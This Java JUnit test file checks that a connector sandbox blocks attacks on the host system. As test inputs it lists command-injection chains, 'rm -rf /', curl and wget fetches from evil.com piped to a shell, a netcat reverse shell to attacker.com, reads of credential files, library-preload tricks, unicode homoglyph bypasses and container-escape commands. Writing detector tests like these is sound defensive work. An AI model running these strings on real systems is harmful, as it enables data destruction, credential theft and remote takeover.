package io.camunda.connector.sandbox.security;

import io.camunda.connector.sandbox.model.TenantPolicy;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import java.util.List;

import static org.assertj.core.api.Assertions.assertThatCode;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

/**
 * Comprehensive security tests to verify that the connector cannot be used
 * to access the host system (e.g., the Mac running the connector).
 * 
 * These tests verify protection against:
 * - Command injection attacks
 * - Path traversal attacks
 * - Unicode/homoglyph bypass attempts
 * - Interpreter execution
 * - Environment variable manipulation
 * - File system escape attempts
 */
@DisplayName("Host System Protection Tests")
class HostSystemProtectionTest {

    private InjectionDetector injectionDetector;
    private CommandParser commandParser;
    private ArgumentSanitizer argumentSanitizer;
    private TenantPolicy defaultPolicy;

    @BeforeEach
    void setUp() {
        injectionDetector = new InjectionDetector();
        commandParser = new CommandParser();
        argumentSanitizer = new ArgumentSanitizer();
        
        // Create a default policy for tests
        defaultPolicy = TenantPolicy.builder()
                .tenantId("test")
                .enabled(true)
                .allowedTools(List.of(
                    TenantPolicy.ToolPolicy.builder()
                        .name("kubectl")
                        .build(),
                    TenantPolicy.ToolPolicy.builder()
                        .name("curl")
                        .build(),
                    TenantPolicy.ToolPolicy.builder()
                        .name("jq")
                        .build()
                ))
                .build();
    }

    @Nested
    @DisplayName("Command Injection Prevention")
    class CommandInjectionTests {

        @ParameterizedTest
        @ValueSource(strings = {
            "ls; cat /etc/passwd",
            "ls && cat /etc/passwd",
            "ls || cat /etc/passwd",
            "ls | cat /etc/passwd",
            "$(cat /etc/passwd)",
            "`cat /etc/passwd`",
            "ls > /tmp/evil",
            "ls >> /tmp/evil",
            "ls < /etc/passwd",
            "ls 2>&1",
            "ls &> /tmp/out",
            "ls & rm -rf /",
            "echo ${PATH}",
            "echo $HOME",
            "ls\nrm -rf /",
            "ls\rrm -rf /",
            "cmd\0malicious"
        })
        @DisplayName("Should block command injection: {0}")
        void shouldBlockCommandInjection(String maliciousInput) {
            assertThatThrownBy(() -> injectionDetector.detectInjection(maliciousInput))
                    .isInstanceOf(SecurityException.class);
        }

        @Test
        @DisplayName("Should block here document injection")
        void shouldBlockHereDoc() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("cat << EOF\nmalicious\nEOF"))
                    .isInstanceOf(SecurityException.class);
        }

        @Test
        @DisplayName("Should block process substitution")
        void shouldBlockProcessSubstitution() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("diff <(ls) <(ls -la)"))
                    .isInstanceOf(SecurityException.class);
        }

        @Test
        @DisplayName("Should block arithmetic expansion")
        void shouldBlockArithmeticExpansion() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("echo $((1+1))"))
                    .isInstanceOf(SecurityException.class);
        }

        @Test
        @DisplayName("Should block history expansion")
        void shouldBlockHistoryExpansion() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("!!"))
                    .isInstanceOf(SecurityException.class);
        }

        @Test
        @DisplayName("Should block brace expansion")
        void shouldBlockBraceExpansion() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("touch file{1,2,3}.txt"))
                    .isInstanceOf(SecurityException.class);
        }
    }

    @Nested
    @DisplayName("Unicode Homoglyph Bypass Prevention")
    class UnicodeBypasses {

        @Test
        @DisplayName("Should detect fullwidth semicolon (U+FF1B)")
        void shouldDetectFullWidthSemicolon() {
            String malicious = "ls\uFF1Bcat /etc/passwd"; // Using fullwidth semicolon
            assertThatThrownBy(() -> injectionDetector.detectInjection(malicious))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("Unicode");
        }

        @Test
        @DisplayName("Should detect Greek question mark (U+037E looks like semicolon)")
        void shouldDetectGreekQuestionMark() {
            String malicious = "ls\u037Ecat /etc/passwd"; // Greek question mark
            assertThatThrownBy(() -> injectionDetector.detectInjection(malicious))
                    .isInstanceOf(SecurityException.class);
        }

        @Test
        @DisplayName("Should detect fullwidth pipe (U+FF5C)")
        void shouldDetectFullWidthPipe() {
            String malicious = "cat file\uFF5Cgrep secret"; // Fullwidth vertical bar
            assertThatThrownBy(() -> injectionDetector.detectInjection(malicious))
                    .isInstanceOf(SecurityException.class);
        }

        @Test
        @DisplayName("Should detect fullwidth ampersand (U+FF06)")
        void shouldDetectFullWidthAmpersand() {
            String malicious = "ls\uFF06\uFF06rm -rf /"; // Fullwidth ampersands
            assertThatThrownBy(() -> injectionDetector.detectInjection(malicious))
                    .isInstanceOf(SecurityException.class);
        }

        @Test
        @DisplayName("Should detect zero-width characters used to hide injection")
        void shouldDetectZeroWidthCharacters() {
            String malicious = "ls\u200B;\u200Brm -rf /"; // Zero-width space
            assertThatThrownBy(() -> injectionDetector.detectInjection(malicious))
                    .isInstanceOf(SecurityException.class);
        }

        @Test
        @DisplayName("Should detect Unicode line separators")
        void shouldDetectUnicodeLineSeparators() {
            String malicious = "ls\u2028rm -rf /"; // Line separator
            assertThatThrownBy(() -> injectionDetector.detectInjection(malicious))
                    .isInstanceOf(SecurityException.class);
        }
    }

    @Nested
    @DisplayName("Interpreter Blocking")
    class InterpreterBlockingTests {

        @ParameterizedTest
        @ValueSource(strings = {
            "python -c 'import os; os.system(\"rm -rf /\")'",
            "python3 -c 'import os; os.system(\"rm -rf /\")'",
            "python2.7 -c 'import os; os.system(\"rm -rf /\")'",
            "ruby -e 'system(\"rm -rf /\")'",
            "perl -e 'system(\"rm -rf /\")'",
            "node -e 'require(\"child_process\").exec(\"rm -rf /\")'",
            "nodejs -e 'code'",
            "lua -e 'os.execute(\"rm -rf /\")'",
            "php -r 'system(\"rm -rf /\");'",
            "php8 -r 'code'"
        })
        @DisplayName("Should block scripting interpreter: {0}")
        void shouldBlockScriptingInterpreter(String command) {
            assertThatThrownBy(() -> commandParser.parse(command))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("interpreter");
        }

        @ParameterizedTest
        @ValueSource(strings = {
            "sh -c 'rm -rf /'",
            "bash -c 'rm -rf /'",
            "zsh -c 'rm -rf /'",
            "dash -c 'rm -rf /'",
            "ash -c 'rm -rf /'"
        })
        @DisplayName("Should block shell invocation: {0}")
        void shouldBlockShellInvocation(String command) {
            assertThatThrownBy(() -> commandParser.parse(command))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("shell");
        }

        @ParameterizedTest
        @ValueSource(strings = {
            "env /bin/bash",
            "xargs -I {} sh -c {}",
            "nohup bash"
        })
        @DisplayName("Should block command execution utilities: {0}")
        void shouldBlockExecutionUtilities(String command) {
            assertThatThrownBy(() -> commandParser.parse(command))
                    .isInstanceOf(SecurityException.class);
        }

        @ParameterizedTest
        @ValueSource(strings = {
            "vi /etc/passwd",
            "vim /etc/passwd",
            "nano /etc/passwd",
            "emacs /etc/passwd"
        })
        @DisplayName("Should block interactive editors: {0}")
        void shouldBlockEditors(String command) {
            assertThatThrownBy(() -> commandParser.parse(command))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("editor");
        }

        @ParameterizedTest
        @ValueSource(strings = {
            "gcc -o evil evil.c",
            "g++ -o evil evil.cpp",
            "clang -o evil evil.c",
            "make all",
            "cmake ."
        })
        @DisplayName("Should block compilers: {0}")
        void shouldBlockCompilers(String command) {
            assertThatThrownBy(() -> commandParser.parse(command))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("Compiler");
        }
    }

    @Nested
    @DisplayName("Path Traversal Prevention")
    class PathTraversalTests {

        @ParameterizedTest
        @ValueSource(strings = {
            "../../../etc/passwd",
            "..\\..\\..\\etc\\passwd",
            "/etc/passwd",
            "/etc/shadow",
            "/proc/self/cmdline",
            "/sys/kernel/",
            "/dev/null",
            "/root/.ssh/id_rsa",
            "/home/user/.bashrc",
            "/var/log/auth.log",
            "~/.ssh/id_rsa"
        })
        @DisplayName("Should block path traversal: {0}")
        void shouldBlockPathTraversal(String maliciousPath) {
            assertThatThrownBy(() -> argumentSanitizer.sanitize(maliciousPath, "kubectl", defaultPolicy))
                    .isInstanceOf(SecurityException.class);
        }

        @Test
        @DisplayName("Should block URL-encoded path traversal")
        void shouldBlockUrlEncodedTraversal() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"))
                    .isInstanceOf(SecurityException.class);
        }

        @Test
        @DisplayName("Should block double-encoded path traversal")
        void shouldBlockDoubleEncodedTraversal() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("%252e%252e%252f"))
                    .isInstanceOf(SecurityException.class);
        }
    }

    @Nested
    @DisplayName("Dangerous Command Blocking")
    class DangerousCommandTests {

        @ParameterizedTest
        @ValueSource(strings = {
            "rm -rf /",
            "rm -rf /*",
            "chmod 777 /etc/passwd",
            "chown root:root /etc/passwd",
            "sudo rm -rf /",
            "su - root",
            "nc -l 4444",
            "netcat -e /bin/bash attacker.com 4444"
        })
        @DisplayName("Should detect dangerous command: {0}")
        void shouldDetectDangerousCommands(String command) {
            assertThatThrownBy(() -> injectionDetector.detectInjection(command))
                    .isInstanceOf(SecurityException.class);
        }

        @Test
        @DisplayName("Should block curl piped to shell")
        void shouldBlockCurlToShell() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("curl http://evil.com/script.sh | sh"))
                    .isInstanceOf(SecurityException.class);
        }

        @Test
        @DisplayName("Should block wget piped to shell")
        void shouldBlockWgetToShell() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("wget -O - http://evil.com/script.sh | bash"))
                    .isInstanceOf(SecurityException.class);
        }

        @Test
        @DisplayName("Should block base64 decode (common for obfuscation)")
        void shouldBlockBase64Decode() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("echo cm0gLXJmIC8= | base64 -d"))
                    .isInstanceOf(SecurityException.class);
        }
    }

    @Nested
    @DisplayName("Absolute/Relative Path Executable Blocking")
    class ExecutablePathTests {

        @ParameterizedTest
        @ValueSource(strings = {
            "/bin/bash",
            "/usr/bin/python",
            "./malicious",
            "../malicious",
            "/tmp/evil"
        })
        @DisplayName("Should block path-based executable: {0}")
        void shouldBlockPathExecutable(String executable) {
            assertThatThrownBy(() -> commandParser.parse(executable + " argument"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("path");
        }
    }

    @Nested
    @DisplayName("Safe Commands Should Pass")
    class SafeCommandTests {

        @Test
        @DisplayName("Should allow simple kubectl command")
        void shouldAllowKubectl() {
            assertThatCode(() -> commandParser.parse("kubectl get pods"))
                    .doesNotThrowAnyException();
        }

        @Test
        @DisplayName("Should allow curl with URL")
        void shouldAllowCurl() {
            assertThatCode(() -> commandParser.parse("curl -s https://api.example.com/data"))
                    .doesNotThrowAnyException();
        }

        @Test
        @DisplayName("Should allow jq with filter")
        void shouldAllowJq() {
            assertThatCode(() -> commandParser.parse("jq '.items[] | .name'"))
                    .doesNotThrowAnyException();
        }

        @Test
        @DisplayName("Should allow terraform plan with vars")
        void shouldAllowTerraform() {
            assertThatCode(() -> commandParser.parse("terraform plan -var=\"name=value\""))
                    .doesNotThrowAnyException();
        }

        @Test
        @DisplayName("Should allow aws cli with profile")
        void shouldAllowAws() {
            assertThatCode(() -> commandParser.parse("aws s3 ls --profile production"))
                    .doesNotThrowAnyException();
        }
    }

    @Nested
    @DisplayName("Input Length and Control Character Tests")
    class InputValidationTests {

        @Test
        @DisplayName("Should reject excessively long input")
        void shouldRejectLongInput() {
            String longInput = "a".repeat(10001);
            assertThatThrownBy(() -> injectionDetector.detectInjection(longInput))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("too long");
        }

        @Test
        @DisplayName("Should reject control characters")
        void shouldRejectControlCharacters() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("cmd\u0007bell"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("Control");
        }

        @Test
        @DisplayName("Should allow tabs in input")
        void shouldAllowTabs() {
            // Tabs are allowed for formatting in some CLI tools
            assertThatCode(() -> injectionDetector.detectInjection("value1\tvalue2"))
                    .doesNotThrowAnyException();
        }
    }

    @Nested
    @DisplayName("Special Argument Patterns")
    class SpecialArgumentTests {

        @Test
        @DisplayName("Should allow normal JSON in argument")
        void shouldAllowJson() {
            assertThatCode(() -> argumentSanitizer.sanitize("{\"name\":\"value\"}", "kubectl", defaultPolicy))
                    .doesNotThrowAnyException();
        }

        @Test
        @DisplayName("Should allow normal file names")
        void shouldAllowNormalFiles() {
            assertThatCode(() -> argumentSanitizer.sanitize("config.yaml", "kubectl", defaultPolicy))
                    .doesNotThrowAnyException();
        }

        @Test
        @DisplayName("Should allow kubernetes resource names")
        void shouldAllowK8sNames() {
            assertThatCode(() -> argumentSanitizer.sanitize("my-deployment-abc123", "kubectl", defaultPolicy))
                    .doesNotThrowAnyException();
        }

        @Test
        @DisplayName("Should block null byte injection in argument")
        void shouldBlockNullByte() {
            assertThatThrownBy(() -> argumentSanitizer.sanitize("file.txt\0../../../etc/passwd", "kubectl", defaultPolicy))
                    .isInstanceOf(SecurityException.class);
        }
    }

    @Nested
    @DisplayName("Mac-Specific Attack Vectors")
    class MacSpecificTests {

        @Test
        @DisplayName("Should block DYLD library injection")
        void shouldBlockDyldInjection() {
            // DYLD_INSERT_LIBRARIES is macOS-specific library injection
            assertThatThrownBy(() -> injectionDetector.detectInjection("DYLD_INSERT_LIBRARIES=/evil.dylib cmd"))
                    .isInstanceOf(SecurityException.class);
        }

        @Test
        @DisplayName("Should block access to macOS keychains")
        void shouldBlockKeychainAccess() {
            assertThatThrownBy(() -> argumentSanitizer.sanitize("/Users/user/Library/Keychains/login.keychain", "curl", defaultPolicy))
                    .isInstanceOf(SecurityException.class);
        }

        @Test
        @DisplayName("Should block osascript (AppleScript)")
        void shouldBlockOsascript() {
            assertThatThrownBy(() -> commandParser.parse("osascript -e 'tell application \"Terminal\" to do script \"rm -rf /\"'"))
                    .isInstanceOf(SecurityException.class);
        }

        @Test
        @DisplayName("Should block access to /Applications")
        void shouldBlockApplicationsAccess() {
            assertThatThrownBy(() -> argumentSanitizer.sanitize("/Applications/Utilities/Terminal.app", "open", defaultPolicy))
                    .isInstanceOf(SecurityException.class);
        }
    }

    @Nested
    @DisplayName("Linux-Specific Attack Vectors")
    class LinuxSpecificTests {

        @Test
        @DisplayName("Should block LD_PRELOAD injection")
        void shouldBlockLdPreloadInjection() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("LD_PRELOAD=/evil.so cmd"))
                    .isInstanceOf(SecurityException.class);
        }

        @Test
        @DisplayName("Should block LD_LIBRARY_PATH injection")
        void shouldBlockLdLibraryPathInjection() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("LD_LIBRARY_PATH=/tmp cmd"))
                    .isInstanceOf(SecurityException.class);
        }

        @Test
        @DisplayName("Should block /proc/self access")
        void shouldBlockProcSelfAccess() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("/proc/self/exe"))
                    .isInstanceOf(SecurityException.class);
        }

        @Test
        @DisplayName("Should block /proc/PID access")
        void shouldBlockProcPidAccess() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("/proc/1/environ"))
                    .isInstanceOf(SecurityException.class);
        }

        @Test
        @DisplayName("Should block /sys/kernel access")
        void shouldBlockSysKernelAccess() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("/sys/kernel/debug"))
                    .isInstanceOf(SecurityException.class);
        }

        @Test
        @DisplayName("Should block Docker socket access")
        void shouldBlockDockerSocketAccess() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("/var/run/docker.sock"))
                    .isInstanceOf(SecurityException.class);
        }

        @Test
        @DisplayName("Should block nsenter (namespace escape)")
        void shouldBlockNsenter() {
            assertThatThrownBy(() -> commandParser.parse("nsenter -t 1 -m -u -i -n -p"))
                    .isInstanceOf(SecurityException.class);
        }

        @Test
        @DisplayName("Should block unshare (namespace manipulation)")
        void shouldBlockUnshare() {
            assertThatThrownBy(() -> commandParser.parse("unshare --mount --pid"))
                    .isInstanceOf(SecurityException.class);
        }

        @Test
        @DisplayName("Should block chroot")
        void shouldBlockChroot() {
            assertThatThrownBy(() -> commandParser.parse("chroot /newroot"))
                    .isInstanceOf(SecurityException.class);
        }

        @Test
        @DisplayName("Should block capability manipulation")
        void shouldBlockCapabilityManipulation() {
            assertThatThrownBy(() -> commandParser.parse("capsh --print"))
                    .isInstanceOf(SecurityException.class);
        }

        @Test
        @DisplayName("Should block cgroup escape attempts")
        void shouldBlockCgroupEscape() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("/sys/fs/cgroup/memory/release_agent"))
                    .isInstanceOf(SecurityException.class);
        }
    }
}
